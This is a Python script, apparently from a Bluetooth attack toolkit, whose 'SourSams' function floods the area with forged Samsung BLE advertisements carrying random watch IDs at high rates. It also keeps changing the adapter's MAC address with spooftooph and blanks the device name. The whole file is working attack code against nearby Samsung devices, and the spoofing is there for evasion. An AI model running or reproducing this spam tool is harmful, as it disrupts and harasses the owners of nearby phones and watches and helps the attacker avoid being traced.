import random
import bluetooth._bluetooth as bluez
from time import sleep
import struct
import socket
import array
import fcntl
import os
import time
from errno import EALREADY
import threading

RED = "\033[31m"
GREEN = '\033[32m'
BLUE = '\033[34m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = "\033[0m"
BRIGHT = '\033[1m'

def decode_hex(string):
    """Decodes a hex string to bytes."""
    assert len(string) % 2 == 0, "String must have an even length"
    return bytes.fromhex(string)

def to_hex_string(byte_data):
    """Converts byte data to a hex string."""
    return byte_data.hex()

def int_to_hex_string(input):
    """Converts an integer to a hex string."""
    return format(input, '02x')

def setup_device(device_id):
    try:
        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        req_str = struct.pack("H", device_id)
        request = array.array("b", req_str)
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno != EALREADY:
            raise
    finally:
        hci_sock.close()

def send_packet(sock):
    manufacturer_id = 0x0075  # Samsung's Manufacturer ID
    prepended_bytes = decode_hex("010002000101FF000043")
    watch_ids = ["1A", "01", "02", "03", "04", "05", "06", "07", "08", "09", "0A", "0B", "0C", "11", "12", "13", "14", "15", "16", "17", "18", "1B", "1C", "1D", "1E", "20"]
    watch_id = random.choice(watch_ids)
    print(f'{RED}Current watch_id: {watch_id}{RESET}')
    watch_bytes = decode_hex(watch_id)
    manufacturer_specific_data = struct.pack('<H', manufacturer_id) + prepended_bytes + watch_bytes

    ad_type_flags = bytes([0x02, 0x01, 0x06])
    manufacturer_data_length = len(manufacturer_specific_data) + 1
    bt_packet = ad_type_flags + bytes([manufacturer_data_length, 0xFF]) + manufacturer_specific_data

    # Optimized advertising parameters: Min interval, Max interval (in 0.625ms units), type, own address type, peer address type, peer address, channel map, filter policy
    min_interval, max_interval = 0x20, 0x40  # 20ms to 40ms intervals
    adv_type = 0x00  # Non-connectable undirected advertising
    own_addr_type = 0x00  # Public Device Address
    peer_addr_type = 0x00  # Public Device Address
    peer_addr = [0x00] * 6  # Not used
    chan_map = 0x07  # All channels
    filter_policy = 0x00  # Process scan and connection requests from all devices

    cmd_pkt = struct.pack("<HHBBB6BBB", min_interval, max_interval, adv_type, own_addr_type, peer_addr_type, *peer_addr, chan_map, filter_policy)
    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)  # Set advertising parameters
    time.sleep(0.03)

    cmd_pkt = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)  # Enable advertising
    time.sleep(0.03)

    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)  # Set advertising data
    time.sleep(0.03)

def random_mac():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: format(x, '02x'), mac))

def spoof_mac(inf):
    new_mac = random_mac() 
    print(f"Spoofing MAC address to {new_mac}")  
    threading.Thread(target=lambda: os.system(f'sudo spooftooph -i hci{inf} -a {new_mac}')).start()

def spoof_name(i):
    try:
        os.system("sudo btmgmt --index 1 name ‎")
        os.system("sudo btmgmt --index 0 name ‎")
    except Exception as e:
        pass

def SourSams(inf):
    print(f"{GREEN}Sour {CYAN}Sams {RED}Attack Initiated...{RESET}{BLUE}")
    device_id = int(inf.replace("hci", ""))
    spoof_name('hci1')
    spoof_mac(device_id)

    setup_device(device_id)
    try:
        sock = bluez.hci_open_dev(device_id)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {device_id}: {e}")

    print("Hold on tight, we are flying far away!")
    try:
        while True:

            send_packet(sock)
            time.sleep(1)
                
            spoof_mac(device_id)
            time.sleep(1)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()

